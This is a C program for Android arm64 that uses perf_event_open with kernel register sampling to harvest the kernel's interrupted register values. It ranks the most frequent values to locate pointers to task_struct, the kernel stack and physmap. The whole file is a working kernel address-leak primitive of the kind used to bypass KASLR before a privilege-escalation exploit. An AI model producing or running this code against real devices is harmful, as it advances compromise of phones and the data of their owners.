/* leak_regs.c — perf + PERF_SAMPLE_REGS_INTR: read kernel registers per sample.
 * Goal: find a pointer to task_struct (current) / stack / physmap.
 * Read-only. Build: aarch64-linux-android30-clang -O2 -static -pie -fPIE
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define NREG 33          /* X0..X30, SP(31), PC(32) */
#define RP 16
#define MAXS 60000

static uint64_t regs[MAXS][NREG]; static int n;

static void drain(void *base,size_t pg,size_t ds,struct perf_event_mmap_page *meta){
    char *d=(char*)base+pg; __sync_synchronize();
    uint64_t head=meta->data_head;
    while(meta->data_tail<head){
        struct perf_event_header *h=(void*)(d+(meta->data_tail%ds));
        if(h->size<sizeof(*h)){meta->data_tail=head;break;}
        if(h->type==PERF_RECORD_SAMPLE){
            char *q=(char*)h+sizeof(*h);
            uint64_t ip; memcpy(&ip,q,8); q+=8;                 /* SAMPLE_IP */
            if(n<MAXS){ for(int k=0;k<NREG;k++){ uint64_t v; memcpy(&v,q,8); q+=8; regs[n][k]=v; } n++; }
        }
        meta->data_tail+=h->size;
    }
}

static int cmp(const void*a,const void*b){uint64_t x=*(uint64_t*)a,y=*(uint64_t*)b;return x<y?-1:x>y?1:0;}

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    printf("=== leak_regs (PERF_SAMPLE_REGS_INTR) ===\n");
    struct perf_event_attr a; memset(&a,0,sizeof(a));
    a.type=PERF_TYPE_HARDWARE; a.size=sizeof(a); a.config=PERF_COUNT_HW_INSTRUCTIONS;
    a.sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_REGS_INTR;
    a.sample_period=200000; a.disabled=1; a.exclude_kernel=0; a.exclude_hv=1; a.wakeup_events=1;
    a.sample_regs_intr=((1ULL<<NREG)-1);        /* all registers */
    int fd=(int)syscall(__NR_perf_event_open,&a,0,-1,-1,0);
    if(fd<0){ printf("[!] perf errno=%d (%s)\n",errno,strerror(errno)); return 1; }
    size_t pg=sysconf(_SC_PAGESIZE), ds=RP*pg, ms=ds+pg;
    void *base=mmap(NULL,ms,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(base==MAP_FAILED){printf("[!] mmap errno=%d\n",errno);return 1;}
    struct perf_event_mmap_page *meta=base;
    ioctl(fd,PERF_EVENT_IOC_RESET,0); ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
    for(long i=0;i<6000000 && n<MAXS;i++){ syscall(172); if((i&0x2fff)==0) drain(base,pg,ds,meta); }
    ioctl(fd,PERF_EVENT_IOC_DISABLE,0); munmap(base,ms); close(fd);
    printf("samples=%d\n",n);
    if(n==0) return 1;
    /* for selected registers: top-5 distinct values */
    int want[]={0,1,2,8,19,20,21,22,23,24,25,26,27,28,29,30,31,32};
    for(unsigned w=0;w<sizeof(want)/sizeof(int);w++){
        int r=want[w];
        uint64_t col[MAXS]; for(int i=0;i<n;i++) col[i]=regs[i][r];
        qsort(col,n,sizeof(uint64_t),cmp);
        printf("x%-2d:",r);
        int shown=0; uint64_t last=0;
        for(int i=0;i<n && shown<4;i++){
            if(i==0||col[i]!=last){
                int c=0; for(int j=i;j<n && col[j]==col[i];j++) c++;
                printf("  %#018llx x%d",(unsigned long long)col[i],c);
                last=col[i]; shown++;
            }
        }
        printf("\n");
    }
    return 0;
}
